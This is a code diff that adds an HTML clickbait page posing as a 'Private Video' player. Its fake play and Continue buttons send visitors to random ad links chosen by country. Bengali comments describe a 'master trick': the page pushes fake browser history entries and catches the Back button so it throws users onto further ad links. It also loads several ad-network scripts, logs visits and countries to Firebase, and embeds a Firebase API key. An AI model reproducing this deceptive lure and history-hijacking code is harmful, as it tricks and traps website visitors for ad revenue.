@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔥 Viral Video 🥵</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://pl28959656.profitablecpmratenetwork.com/4f/f2/29/4ff2297fe77a70226621bc69b5e71dcd.js"></script>
+<style>
+body{background:linear-gradient(to bottom,#111827,#000);color:white;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+.play-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:4rem;background:rgba(255,0,0,0.7);padding:1rem 2rem;border-radius:9999px;animation:pulse 1.5s infinite;}
+@keyframes pulse{0%{transform:translate(-50%,-50%) scale(1);}50%{transform:translate(-50%,-50%) scale(1.1);}100%{transform:translate(-50%,-50%) scale(1);}}
+#loading{display:none;} #unlock{display:none;}
+</style>
+</head>
+
+<body>
+
+<div class="max-w-md w-full p-4 text-center">
+<h1 id="title" class="text-3xl mb-4 font-bold">🔥 Private Video🔥</h1>
+
+<div class="relative mb-4 cursor-pointer" onclick="startFlow()">
+<img id="thumb" class="rounded-xl w-full" src="https://i.imgur.com/8Km9tLL.jpg">
+<div class="play-btn">▶</div>
+</div>
+
+<button onclick="startFlow()" class="bg-red-600 w-full py-3 rounded mb-3">▶ Play Video</button>
+
+<div id="loading">⌛ Loading... 👇⬇️</div>
+<button id="unlock" onclick="goNext()" class="bg-green-600 w-full py-3 mt-3 rounded">Continue</button>
+
+<!-- 💰 ৩. Adsterra Native Banner Ad Code এখানে বসাবেন 💰 -->
+<div class="mt-4"> <script async="async" data-cfasync="false" src="https://pl28959657.profitablecpmratenetwork.com/4325533b58beff08faa03ee632bd31a0/invoke.js"></script>
+<div id="container-4325533b58beff08faa03ee632bd31a0"></div>
+    <!-- ব্যানার অ্যাডের স্ক্রিপ্ট এখানে পেস্ট করুন -->
+</div>
+</div>
+
+<!-- ✅ Firebase v8 FIX -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDak1DyVV6GKRnytPfFtXtrec_iurdFY30",
+  authDomain: "khairul-video-play.firebaseapp.com",
+  databaseURL: "https://khairul-video-play-default-rtdb.firebaseio.com",
+  projectId: "khairul-video-play",
+  storageBucket: "khairul-video-play.firebasestorage.app",
+  messagingSenderId: "282569730084",
+  appId: "1:282569730084:web:649b69eb9c73d865a850b1",
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let links = [];
+
+// ✅ Visit Track
+db.ref("visits").push({time:Date.now()});
+
+// ✅ Online User
+let onlineRef = db.ref("stats/online");
+onlineRef.transaction(n => (n||0)+1);
+window.addEventListener("beforeunload",()=>{
+  onlineRef.transaction(n => (n||1)-1);
+});
+
+// ✅ Load Template
+db.ref("global").once("value").then(gSnap=>{
+ let g = gSnap.val() || {};
+ let template = g.defaultTemplate || "t1";
+
+ db.ref("templates/"+template+"/settings").once("value").then(snap=>{
+  let d = snap.val() || {};
+
+  title.innerText = g.title || d.title || "🔥 Private Video";
+  thumb.src = g.thumbnail || d.thumbnail || "https://i.imgur.com/8Km9tLL.jpg";
+
+  // ✅ Geo Fix + Fallback
+  fetch("https://ipapi.co/json/")
+  .then(r=>r.json())
+  .then(geo=>{
+    let c = geo.country || "BD";
+    db.ref("stats/countries/"+c).transaction(n=>(n||0)+1);
+    links = (d.geo && (d.geo[c] || d.geo["BD"])) || [];
+  })
+  .catch(()=>{
+    links = (d.geo && d.geo["BD"]) || [];
+  });
+
+ });
+});
+
+// UI Flow
+function startFlow(){
+  loading.style.display="block";
+  setTimeout(()=>unlock.style.display="block",1500);
+}
+
+// Pick Link
+function pickLink(){
+  if(!links || links.length===0){
+    alert("No link set ❌");
+    return null;
+  }
+  return links[Math.floor(Math.random()*links.length)];
+}
+
+// 🔴 Redirect & History Hijack (মাস্টার ট্রিক) 🔴
+function goNext(){
+  let link = pickLink();
+  if(!link) return;
+
+  // ফায়ারবেসে ক্লিক কাউন্ট হবে
+  db.ref("clicks").push({time:Date.now()});
+
+  // ১. ইউজার Continue তে ক্লিক করার পাওয়ার কাজে লাগিয়ে একসাথে ৩টি ফেক হিস্ট্রি সেভ করা হলো
+  for (let i = 3; i >= 1; i--) {
+      history.pushState({ adIndex: i }, "Step " + i, "?step=" + i);
+  }
+
+  // ২. এরপর ইউজারকে ১ম ডাইরেক্ট লিংকে পাঠানো হলো
+  setTimeout(() => {
+      window.location.href = link;
+  }, 100);
+}
+
+// 🔴 ৩. ইউজার ব্যাক করে ফিরে আসলেই ব্রাউজারকে ফাঁকি দিয়ে অটোমেটিক আবার ডাইরেক্ট লিংকে ছুড়ে মারবে! 🔴
+window.addEventListener('popstate', function(event) {
+    if (event.state && event.state.adIndex) {
+        let nextLink = pickLink(); // ডাটাবেস থেকে আবার নতুন লিংক নিবে
+        if(nextLink) {
+            window.location.replace(nextLink); // Replace ব্যবহার করা হলো যাতে ব্রাউজার ব্লক না করে
+        }
+    }
+});
+</script>
+<script src="https://pl28959660.profitablecpmratenetwork.com/17/22/e8/1722e88cb95553639a3628df8481f382.js"></script>
+</body>
+</html>
